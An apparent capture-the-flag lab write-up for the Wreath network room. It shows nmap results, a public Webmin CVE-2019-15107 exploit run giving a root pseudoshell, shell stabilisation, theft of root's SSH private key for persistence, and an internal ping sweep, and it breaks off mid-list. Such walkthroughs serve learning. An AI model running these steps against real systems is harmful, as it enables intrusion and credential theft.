# - Nmap
````bash
PORT      STATE  SERVICE    VERSION
22/tcp    open   ssh        OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey: 
|   3072 9c:1b:d4:b4:05:4d:88:99:ce:09:1f:c1:15:6a:d4:7e (RSA)
|   256 93:55:b4:d9:8b:70:ae:8e:95:0d:c2:b6:d2:03:89:a4 (ECDSA)
|_  256 f0:61:5a:55:34:9b:b7:b8:3a:46:ca:7d:9f:dc:fa:12 (ED25519)
80/tcp    open   http       Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_http-title: 400 Bad Request
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
443/tcp   open   ssl/http   Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1c)
|_ssl-date: TLS randomness does not represent time
|_http-title: 400 Bad Request
| tls-alpn: 
|_  http/1.1
|_http-server-header: Apache/2.4.37 (centos) OpenSSL/1.1.1c
| ssl-cert: Subject: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Issuer: commonName=thomaswreath.thm/organizationName=Thomas Wreath Development/stateOrProvinceName=East Riding Yorkshire/countryName=GB
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-08-04T20:20:25
| Not valid after:  2024-08-03T20:20:25
| MD5:   e0ad:f3df:443a:760b:1d19:4ff7:7860:2456
|_SHA-1: aa1e:ddc4:41cd:958c:8efd:53a3:f43c:eedc:26a3:b202
9090/tcp  closed zeus-admin
10000/tcp open   http       MiniServ 1.890 (Webmin httpd)
|_http-favicon: Unknown favicon MD5: 1E5A7939D17BBCA08F889CB5A6E49621
|_http-title: Login to Webmin
| http-methods: 
|_  Supported Methods: HEAD POST OPTIONS
````
- - On exploring website I found nothing.
- - On observing I got **Miniserv** running on port 10000 with a vulnerable version.
- - On googling I found [CVE-2019-15107](https://github.com/MuirlandOracle/CVE-2019-15107) exploit.
````bash
└─$ python3 CVE-2019-15107.py 10.200.96.200

        __        __   _               _         ____   ____ _____                                                                                                                           
        \ \      / /__| |__  _ __ ___ (_)_ __   |  _ \ / ___| ____|                                                                                                                          
         \ \ /\ / / _ \ '_ \| '_ ` _ \| | '_ \  | |_) | |   |  _|                                                                                                                            
          \ V  V /  __/ |_) | | | | | | | | | | |  _ <| |___| |___                                                                                                                           
           \_/\_/ \___|_.__/|_| |_| |_|_|_| |_| |_| \_\____|_____|                                                                                                                           
                                                                                                                                                                                             
                                                @MuirlandOracle                                                                                                                              
                                                                                                                                                                                             
                                                                                                                                                                                             
[*] Server is running in SSL mode. Switching to HTTPS
[+] Connected to https://10.200.96.200:10000/ successfully.
[+] Server version (1.890) should be vulnerable!
[+] Benign Payload executed!

[+] The target is vulnerable and a pseudoshell has been obtained.
Type commands to have them executed on the target.                                                                                                                                           
[*] Type 'exit' to exit.
[*] Type 'shell' to obtain a full reverse shell (UNIX only).

# whoami
root
````
- Next, is to stabilise the shell. To do so I got a reverse shell to my system using Netcat and run the following commands.
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

ctrl+z

stty raw -echo;fg                                            
```
- Next for persistence, I cat the shadow file but was not able to crack the password.
- So, I copied the id_rsa file from the `/root/.ssh/` folder and paste it into my machine.
- Did `chmod +600 id_rsa` to get the field worked for ssh connections.
```bash
ssh -i id_rsa root@10.200.96.200
[root@prod-serv ~]# whoami
root
```
- Now, we have initial access to the machine. Let's do a quick ping to the internal network.
```bash
for i in {1..255}; do (ping -c 1 10.200.96.${i} | grep "bytes from" &); done

64 bytes from 10.200.96.1: icmp_seq=1 ttl=255 time=0.344 ms
64 bytes from 10.200.96.200: icmp_seq=1 ttl=64 time=0.076 ms
64 bytes from 10.200.96.250: icmp_seq=1 ttl=64 time=1.71 ms
```
- So, we found 2 machines in the internal network.
- 
